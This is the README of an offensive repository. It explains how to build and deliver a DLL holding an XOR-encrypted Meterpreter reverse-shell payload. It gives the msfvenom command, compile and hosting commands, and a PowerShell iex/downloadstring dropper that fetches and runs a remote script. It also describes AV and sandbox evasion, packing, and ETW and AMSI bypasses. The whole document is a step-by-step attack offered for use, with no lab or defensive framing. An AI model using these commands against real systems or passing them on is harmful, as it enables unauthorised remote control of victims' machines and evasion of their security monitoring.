# DLL Injection

This repository provides a framework for performing DLL injection with a Meterpreter payload generated using MSFVenom. It includes XOR encryption for shellcode obfuscation and techniques to evade detection by AV and sandbox environments. The repository consists of a helper program and the main injection code.

## Overview

The goal of this project is to inject a reverse shell (Meterpreter) into a target system by executing a DLL that contains obfuscated shellcode. The process includes:

1. **Generating a payload using MSFVenom**.
2. **Encrypting the shellcode using XOR**.
3. **Compiling the payload into a DLL**.
4. **Hosting the DLL and a PowerShell dropper script**.
5. **Executing the payload remotely using a dropper**.
6. **Utilizing evasion techniques** to bypass AV and sandbox detection.

## Steps

### 1. Generate a Meterpreter Payload

Create a Meterpreter reverse TCP payload using MSFVenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.XX LPORT=443 -f csharp
```

- **LHOST**: Replace `192.168.1.XX` with your listener IP.
- **LPORT**: The port for reverse connection (use `443` or any other available port).

The generated C# shellcode will be obfuscated using XOR encryption in the following steps.

### 2. Shellcode Encryption

Place the generated shellcode into the helper file (`xorDLLHelper.cs`) for XOR encryption. Modify the XOR key to customize the obfuscation and update the DLL injection program accordingly.

### 3. Compile the DLL

Once the shellcode is encrypted, compile the DLL injection code into a dynamic link library (DLL):

```bash
sudo csc /target:library /out:runner.dll runner.cs
```

This command compiles the main injection code (`runner.cs`) into `runner.dll`, containing the encrypted shellcode.

### 4. Host the DLL and PowerShell Script

To deliver the payload remotely, host both the compiled `runner.dll` and the PowerShell script (`runner.ps1`) on a web server. You can use Python’s built-in HTTP server for this:

```bash
python3 -m http.server 80
```

Ensure that both files are available on the web server, accessible via the appropriate URL.

### 5. Dropper Execution

Use a PowerShell command to download and execute the payload remotely on the target system:

```powershell
iex(new-object net.webclient).downloadstring('http://<YourIP>/runner.ps1')
```

Replace `<YourIP>` with the IP address of the server hosting the DLL and PowerShell script.

### Evasion Techniques

The code includes techniques to evade AV and sandbox detection:

- **XOR Encryption**: Shellcode is encrypted using XOR to evade signature-based detection by AV solutions.
- **Behavior-based Detection Evasion**: The injection program may include time delays to bypass behavior-based detection systems that rely on immediate execution patterns.
- **Sandbox Evasion**: Time delays or specific checks are implemented to prevent the payload from executing in virtualized or sandboxed environments, ensuring that sandbox detection systems fail to detect malicious behavior.

### 6. Packing and Obfuscation

If the payload is caught by AV, additional tools can be used to pack and obfuscate the DLL. Consider using tools like `ConfuserEx` or `Themida` for further packing and protection. You can also implement additional bypasses such as:

- **No ETW**: Disabling Event Tracing for Windows (ETW) to evade monitoring.
- **No AMSI**: Bypassing the Anti-Malware Scan Interface (AMSI) to prevent runtime detection.
  
## Conclusion

This repository provides a framework for deploying obfuscated Meterpreter payloads via DLL injection. By incorporating XOR encryption and advanced evasion techniques, this approach can bypass both signature-based and behavior-based detection systems.
